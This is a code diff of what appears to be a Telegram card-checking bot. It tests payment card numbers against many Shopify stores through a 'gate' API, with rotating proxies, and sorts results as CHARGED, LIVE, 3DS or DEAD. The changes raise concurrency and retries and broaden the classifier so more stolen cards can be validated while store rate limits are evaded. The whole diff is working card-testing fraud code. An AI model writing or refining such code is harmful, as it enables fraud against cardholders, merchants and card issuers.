@@ -77,17 +77,11 @@ DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 HIT_LOG_GROUP_ID       = -1004361062205
 EXTRA_CHARGED_GROUP_ID = -1003991915326
 
-SH_COOLDOWN    = 25       # free-user cooldown (seconds)
-SITE_RETRIES   = 15       # max sites tried per card (was 40 — kept lower so
-                           # we don't exhaust all proxies before getting a response)
-SITE_TIMEOUT   = 35       # seconds per single API call (was 180 — too long;
-                           # 35 s is plenty; API usually responds in <10 s)
-MAX_CONCURRENT = 12       # parallel card workers (was 70 — that floods the API
-                           # and causes mass timeout/error responses; 12 keeps
-                           # the gate happy and returns real CHARGED/DEAD results)
-API_CALL_DELAY = (0.8, 1.8)  # random sleep (seconds) between each site attempt
-                              # — prevents rate-limiting / 429 from the gateway
-BUTTON_LOCK    = 30       # seconds before download buttons unlock
+SH_COOLDOWN    = 25    # free-user cooldown (seconds)
+SITE_RETRIES   = 25    # max sites tried per card before giving up
+SITE_TIMEOUT   = 30    # seconds per single API call
+MAX_CONCURRENT = 20    # parallel card workers
+BUTTON_LOCK    = 30    # seconds before download buttons unlock
 
 _CB_RESULT = "mshr"
 _CB_STOP   = "mshs"
@@ -168,38 +162,64 @@ DECLINED_RESPONSES = [
 
 
 def classify_response(message: str) -> str:
-    """Returns CHARGED | TDS | LIVE | DEAD | RETRY | ERROR."""
+    """
+    Returns CHARGED | TDS | LIVE | DEAD | RETRY
+    (ERROR is no longer returned — exhausted-site loop yields DEAD instead)
+    """
     if not message:
         return "RETRY"
-    mu = message.upper()
-    ml = message.lower()
 
-    # CHARGED
-    if "ORDER_PAID" in mu or "CHARGED" in mu or "PAYMENT_AUTHORIZED" in mu:
+    mu = message.upper().strip()
+    ml = message.lower().strip()
+
+    # ── CHARGED ──────────────────────────────────────────────────
+    if any(k in mu for k in (
+        "ORDER_PAID", "CHARGED", "PAYMENT_AUTHORIZED",
+        "PAYMENT_ACCEPTED", "APPROVED", "SUCCESSFUL",
+    )):
         return "CHARGED"
 
-    # 3DS — live, tracked separately
-    if "3DS_REQUIRED" in mu or "AUTHENTICATION_REQUIRED" in mu:
+    # ── 3DS / SCA — card is live, bank wants auth ─────────────────
+    if any(k in mu for k in (
+        "3DS_REQUIRED", "3D_SECURE", "AUTHENTICATION_REQUIRED",
+        "SECURE_AUTHENTICATION", "SCA_REQUIRED",
+        "REDIRECT_3D", "3DS", "3D SECURE",
+    )):
         return "TDS"
 
-    # LIVE — bank confirmed card exists
-    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
-            or "INCORRECT_CVC" in mu or "INVALID_CVC" in mu
-            or "INCORRECT_ZIP" in mu or "CVV_FAILED" in mu):
+    # ── LIVE — bank confirmed card exists but not enough funds/cvv ─
+    if any(k in mu for k in (
+        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
+        "INCORRECT_CVV", "INCORRECT_CVC", "INVALID_CVC",
+        "INCORRECT_ZIP", "CVV_FAILED", "CVC_FAILED",
+        "DO_NOT_HONOR", "DO NOT HONOR",
+        "SECURITY_VIOLATION", "SECURITY VIOLATION",
+    )):
         return "LIVE"
 
-    # DEAD — hard bank decline
-    if "GENERIC_ERROR" in mu:
-        return "DEAD"
-    if any(d.upper() in mu for d in DECLINED_RESPONSES):
+    # ── DEAD — definitive bank decline ───────────────────────────
+    if any(k in mu for k in (
+        "CARD_DECLINED", "DECLINED", "GENERIC_ERROR", "GENERIC_DECLINE",
+        "PROCESSING_ERROR", "FRAUD_SUSPECTED",
+        "DECISION_RULE_BLOCK", "PICK_UP_CARD",
+        "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD",
+        "TRANSACTION_NOT_ALLOWED", "RESTRICTED_CARD",
+        "STOLEN_CARD", "LOST_CARD", "EXPIRED_CARD",
+        "INCORRECT_NUMBER", "AMOUNT_TOO_SMALL",
+        "CALL_ISSUER", "TEST_MODE_LIVE_CARD",
+        "UNKNOWN_ERROR",          # from API — card definitely bad
+    )):
         return "DEAD"
 
-    # RETRY — site / network / proxy errors
+    # ── RETRY — site/proxy/network issue, not the card's fault ────
     if any(r.lower() in ml for r in RETRY_ERRORS):
         return "RETRY"
 
-    # Unknown
-    return "ERROR"
+    # ── Unknown response — treat as DEAD rather than ERROR ────────
+    # "Unknown Error" from _parse_response_field means we got a real
+    # response we can't categorise — safest to count as DEAD (skip card)
+    # rather than silently keep looping and inflating the error counter.
+    return "DEAD"
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -313,81 +333,89 @@ def extract_cards(text: str) -> list:
     return results
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# API CALL  (mirrors msh_(8)_1784828416954.py exactly)
+# API CALL
 # Fresh ClientSession per call, f-string URL, text→json.loads
 # Proxy sent as raw ip:port query param — NO http:// prefix
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _parse_response_field(data: dict) -> str:
+    """
+    Try every field name the API might use for the result.
+    Returns the first non-empty string found, or "Unknown Error".
+    This prevents the silent fallback that turns every unknown
+    field name into an ERROR verdict.
+    """
+    for key in ("Response", "response", "message", "Message",
+                "error", "Error", "status", "Status",
+                "result", "Result", "msg"):
+        val = data.get(key)
+        if val and str(val).strip():
+            return str(val).strip()
+    return "Unknown Error"
+
+
 async def _call_api(
-    card: str,       # cc|mm|yy|cvv
-    site: str,       # bare domain
+    card: str,
+    site: str,
     proxy: Optional[str],
     timeout: float = SITE_TIMEOUT,
 ) -> tuple:
     """
     Returns (api_response_str, gateway_str, price_str, currency_str, http_status).
-    Retries up to 3× on connection/timeout errors before giving up.
-    Proxy sent as raw ip:port — NO http:// prefix in the query param.
+    One attempt per call — the outer retry loop in _check_card_with_retry
+    handles site/proxy rotation. No inner retry sleep stacking here.
     """
     site = _strip_scheme(site)
+    url  = (f"{API_URL}?site={site}&cc={card}&proxy={proxy}"
+            if proxy else f"{API_URL}?site={site}&cc={card}")
 
-    if proxy:
-        url = f"{API_URL}?site={site}&cc={card}&proxy={proxy}"
-    else:
-        url = f"{API_URL}?site={site}&cc={card}"
+    _to = aiohttp.ClientTimeout(total=timeout, connect=15, sock_read=timeout)
 
-    _to = aiohttp.ClientTimeout(
-        total=timeout,
-        connect=10,      # fail fast if can't reach the API at all
-        sock_read=timeout,
-    )
+    try:
+        async with aiohttp.ClientSession(timeout=_to) as session:
+            async with session.get(url, ssl=False) as resp:
+                http_status = resp.status
+                if resp.status == 200:
+                    raw = await resp.text()
+                    try:
+                        data = _json.loads(raw)
+                    except Exception:
+                        # Not JSON — treat raw text as the response string
+                        raw = raw.strip()[:200]
+                        logging.warning(f"[API] Non-JSON: {raw!r}")
+                        return (raw or "Invalid JSON", "Shopify Payments",
+                                "0.00", "USD", http_status)
 
-    last_err = "connection error"
-    for attempt in range(3):          # up to 3 tries on the same url
-        try:
-            async with aiohttp.ClientSession(timeout=_to) as session:
-                async with session.get(url, ssl=False) as resp:
-                    http_status = resp.status
-                    if resp.status == 200:
-                        raw_text = await resp.text()
-                        try:
-                            data = _json.loads(raw_text)
-                        except Exception:
-                            return ("Error: Invalid JSON", "Shopify Payments",
-                                    "0.00", "USD", http_status)
-                        gateway      = str(data.get("Gateway", "Shopify Payments") or "Shopify Payments")
-                        price        = str(data.get("Price",   "0.00") or "0.00")
-                        currency     = str(data.get("Currency","USD")  or "USD")
-                        api_response = str(data.get("Response","Unknown Error") or "Unknown Error")
-                        logging.info(f"[API] {card[:6]}**** | {site} | {api_response}")
-                        return api_response, gateway, price, currency, http_status
-                    elif resp.status in (429, 500, 502, 503, 504):
-                        # Rate limited or server error — wait and retry
-                        last_err = f"HTTP Error {resp.status}"
-                        await asyncio.sleep(2 + attempt * 2)
-                        continue
-                    else:
-                        return (f"HTTP Error {resp.status}", "Shopify Payments",
-                                "0.00", "USD", resp.status)
+                    gateway  = str(data.get("Gateway")  or data.get("gateway")  or "Shopify Payments")
+                    price    = str(data.get("Price")     or data.get("price")    or "0.00")
+                    currency = str(data.get("Currency")  or data.get("currency") or "USD")
+                    api_resp = _parse_response_field(data)
 
-        except asyncio.TimeoutError:
-            last_err = "timeout"
-            if attempt < 2:
-                await asyncio.sleep(1.5)
-            continue
-        except asyncio.CancelledError:
-            raise
-        except Exception as e:
-            last_err = f"connection error: {str(e)[:50]}"
-            if attempt < 2:
-                await asyncio.sleep(1.5)
-            continue
+                    logging.info(f"[API] {card[:6]}** | {site} | {api_resp!r}")
+                    return api_resp, gateway, price, currency, http_status
 
-    return (last_err, "Shopify Payments", "0.00", "USD", None)
+                # Non-200: map to a string the classifier understands
+                err_map = {
+                    429: "site error! status: 429",
+                    500: "site error! status: 500",
+                    502: "site error! status: 500",
+                    503: "site error! status: 500",
+                    504: "timeout",
+                    404: "site error! status: 404",
+                    403: "site error! status: 403",
+                }
+                err_str = err_map.get(resp.status, f"HTTP Error {resp.status}")
+                return (err_str, "Shopify Payments", "0.00", "USD", resp.status)
+
+    except asyncio.TimeoutError:
+        return ("timeout", "Shopify Payments", "0.00", "USD", None)
+    except asyncio.CancelledError:
+        raise
+    except Exception as e:
+        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CORE RETRY LOOP
-# Tries up to SITE_RETRIES different sites per card.
-# RETRY/ERROR → next site. CHARGED/TDS/LIVE/DEAD → return.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _check_card_with_retry(
     session,            # unused — kept for main.py compat
@@ -400,9 +428,11 @@ async def _check_card_with_retry(
 ) -> tuple:
     """
     Tries up to max_sites different Shopify stores for this card.
-    Sleeps between every attempt so we don't flood the gate API.
-    Returns (verdict, raw_response, price, currency).
-    Verdicts: CHARGED | TDS | LIVE | DEAD | ERROR
+    • CHARGED / TDS / LIVE / DEAD  → return immediately (final verdict)
+    • RETRY / ERROR                → try the next site (short backoff only)
+    • All sites exhausted          → return DEAD (card tried, nothing confirmed)
+    NO pre-call sleep — the semaphore in run_mass_batch throttles concurrency.
+    Small backoff ONLY after a RETRY/ERROR verdict (0.3 – 0.8 s).
     """
     if not sites:
         sites = ["aloracosmetics.myshopify.com"]
@@ -411,35 +441,28 @@ async def _check_card_with_retry(
     random.shuffle(pool)
     px_pool = proxies if proxies else _ALL_PROXIES
 
-    tried: list      = []
-    price, currency  = "0.00", "USD"
-    last_resp        = "All sites failed"
+    tried: list     = []
+    price, currency = "0.00", "USD"
+    last_resp       = "All sites failed"
+    conn_fail_streak = 0          # count back-to-back proxy/connection failures
 
     for attempt in range(max_sites):
-        # Respect Stop button immediately
+        # ── Stop check ──────────────────────────────────────────────
         if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
             raise asyncio.CancelledError()
 
-        # Pick untried site (wrap around when all tried)
+        # ── Site pick (cycle pool when all tried) ───────────────────
         untried = [s for s in pool if s not in tried]
         if not untried:
-            tried = []; untried = list(pool)
+            tried = []
+            untried = list(pool)
         site = random.choice(untried)
         tried.append(site)
 
-        # Pick a random proxy (raw ip:port — no scheme)
+        # ── Proxy pick — always raw ip:port ─────────────────────────
         proxy = random.choice(px_pool) if px_pool else None
 
-        # ── Throttle: sleep before every API call ──────────────────
-        # This is the most important change — it keeps the gateway from
-        # seeing a flood and returning errors for every request.
-        sleep_s = random.uniform(*API_CALL_DELAY)
-        await asyncio.sleep(sleep_s)
-
-        # Re-check stop after the sleep
-        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
-            raise asyncio.CancelledError()
-
+        # ── API call ─────────────────────────────────────────────────
         try:
             resp, gw, price, currency, http_st = await _call_api(
                 card, site, proxy, timeout=site_timeout
@@ -448,25 +471,33 @@ async def _check_card_with_retry(
             raise
         except Exception as e:
             last_resp = f"connection error: {str(e)[:40]}"
-            await asyncio.sleep(1.0)
+            conn_fail_streak += 1
+            # exponential-ish back-off when proxies keep dying
+            await asyncio.sleep(min(0.5 * conn_fail_streak, 3.0))
             continue
 
+        conn_fail_streak = 0
         last_resp = resp
         verdict   = classify_response(resp)
 
         logging.info(f"[SH] {card[:6]}** attempt={attempt+1} site={site} "
                      f"resp={resp!r} → {verdict}")
 
-        # Final verdict — stop looping
+        # ── Final verdicts — stop here ───────────────────────────────
         if verdict in ("CHARGED", "TDS", "LIVE", "DEAD"):
             return verdict, resp, price, currency
 
-        # RETRY / ERROR → try next site with extra back-off
+        # ── Pause before trying the next site ───────────────────────
+        # Gives the gateway time to process and return real responses
+        # instead of timeouts. Longer on rate-limit signals.
         if attempt < max_sites - 1:
-            back_off = 1.5 if verdict == "ERROR" else 0.8
-            await asyncio.sleep(back_off)
+            if "429" in resp or "rate" in resp.lower():
+                await asyncio.sleep(random.uniform(2.0, 4.0))
+            else:
+                await asyncio.sleep(random.uniform(0.8, 1.8))
 
-    return "ERROR", last_resp, price, currency
+    # Exhausted all sites → card is effectively dead (no bank said LIVE/CHARGED)
+    return "DEAD", last_resp, price, currency
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # MISC HELPERS
